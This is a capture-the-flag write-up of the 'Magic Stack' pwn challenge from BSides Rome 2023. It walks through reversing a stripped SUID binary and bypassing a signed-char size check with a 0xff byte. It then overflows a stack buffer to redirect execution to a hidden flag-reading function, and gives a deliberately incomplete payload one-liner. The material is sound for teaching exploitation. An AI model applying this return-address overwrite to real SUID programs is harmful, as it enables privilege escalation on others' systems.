# Challenge: Magic Stack

## Category: PWN

This challenge is part of the '_Bsides Rome 2023_' CTF event hosted by pwnx.io. I blooded for my team: 'ARESTeamITA'.

The challenge let you connet via ssh to a vulnerable machine that has a SUID custom binary. The binary, called 'magic', let you retrieve the flag saved
in another account /home folder as /home/flag.txt.

```bash
ssh user@<CHALLENGE_IP>  # ssh connection
scp user@<CHALLENGE_IP>:/usr/bin/magic ./magic
```

The file was a 64-bit stripped binary as you can see from the output of the ```file``` command:
```
magic: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=061c4f61b2214e204f2392bf84a63723dd3973ac, for GNU/Linux 3.2.0, stripped
```

A stripped binary is harder to debug and read but for this challenge gdb and Ghidra are enough.

At this point is important to be precise and note important informations at every step.

+ Step 1: Find the main() function 

For every executable there is an 'entry point' or place where the execution code starts. 
In C/C++ compiled binary the entry point calls main() and prepare the environment using  ```__libc_start_main ```.
This step can be done via Ghidra (find the function) or via gdb that let you know the address 
```
(gdb) info files
	Entry point: 0x401150
```

Now we can read the main function:
```C
undefined8 FUN_0040129b(int param_1,long param_2)

{
  undefined local_26 [10];
  byte local_1c [10];
  byte local_12;
  byte local_11;
  FILE *local_10;
  
  setuid(1000);
  setgid(1000);
  if (param_1 < 2) {
    puts("An argument is required.");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  local_10 = fopen(*(char **)(param_2 + 8),"rb");
  if (local_10 == (FILE *)0x0) {
    puts("[-] Provide a file as input");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  memset(local_1c,0,10);
  fread(local_1c,4,1,local_10);
  local_11 = local_1c[0];
  if ('\n' < (char)local_1c[0]) {
    perror("magic size > MAX_MAGIC_SZ");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_12 = local_1c[0];
  memset(local_26,0,10);
  fread(local_26,(ulong)local_12,1,local_10);
  printf("Magic value: %s\n",local_26);
  return 0;
}
```

A beautified version is :

![beautified](https://github.com/partywavesec/partywavesec.github.io/blob/main/ctf/images/magic_stack_main.png)

The main function accept as first arg a file path that is opened by ```fopen()``` function. An array of 10 char (renamed 'file_content') read 10 bytes from the FILE stream 
and checks if the first char is lower than '\n' char.

A char is a byte and can be represented as decimal, range from (-127,128), in particular '\n' is 0xa or 10 in decimal.

If the previous check is passed the value of the first char read is passed as 'size' argument of the next ```fread()```. *There is something that the attacker can control!*

+ Step 2: Identify how to read the flag

In the 'magic' binary there is another function that reads and prints the flag file:
```c
void FUN_00401236(void) {
  char local_48 [56];
  FILE *local_10;
  
  memset(local_48,0,0x32);
  local_10 = fopen("/home/pwnx/flag.txt","r");
  fread(local_48,0x27,1,local_10);
  puts(local_48);
  return;
}
```

This function is inside our file, we know its address - 0x401236 - but main() never invoke it. The attacker has to change the execution flow.

Note: the address of a function can be obtained via Ghidra or via gdb by manually exploring the code as the binary is stripped

```
(gdb) x/15i 0x401236
   0x401236:	endbr64 
   0x40123a:	push   rbp
   0x40123b:	mov    rbp,rsp
   0x40123e:	sub    rsp,0x40
   0x401242:	lea    rax,[rbp-0x40]
   0x401246:	mov    edx,0x32
   0x40124b:	mov    esi,0x0
   0x401250:	mov    rdi,rax
   0x401253:	call   0x4010f0 <memset@plt>
   0x401258:	lea    rsi,[rip+0xda5]        # 0x402004
   0x40125f:	lea    rdi,[rip+0xda0]        # 0x402006
   0x401266:	call   0x401110 <fopen@plt>
   0x40126b:	mov    QWORD PTR [rbp-0x8],rax
   0x40126f:	mov    rdx,QWORD PTR [rbp-0x8]
   0x401273:	lea    rax,[rbp-0x40]
(gdb) x/2s 0x402004
0x402004:	"r"
0x402006:	"/home/pwnx/flag.txt"
```

+ Step 3: Exploit

The attacker goal now is to use a big number over the second buffer populated by the second ```fread()```.
The tricky part is not difficult, if the the first char overflow 128 is converted as signed int in a negative number that pass the check against '\n'.

For this reason i used '\xff' char = 255 as the first byte of my payload file.

'\n' char is interpreted as 10 and '\xff' as -127 and the ```if('\n' < file_content[0])``` condition is False and the flow can continue.

Now its possible to read a lot of chars, way more than the buffer and override the Istruction Pointer to call the 'read flag' function.
It's enough to create a long strings with the function address or you can calculate the correct offset.


```bash
# no offset
# complete the exploit by yourself now - use \xff
python2 -c 'print [NOW_COMPLETE_PAYLOAD] + "6\x12@\x00\x00\x00\x00\x00" * 100' > runme

/usr/bin/magic <PAYLOAD_FILE>

# calculate offset
msf-pattern_create -l 150
msf-pattern_offset -q <VALUE>
```

![flag](https://github.com/partywavesec/partywavesec.github.io/blob/main/ctf/images/magic_stack_flag.png)
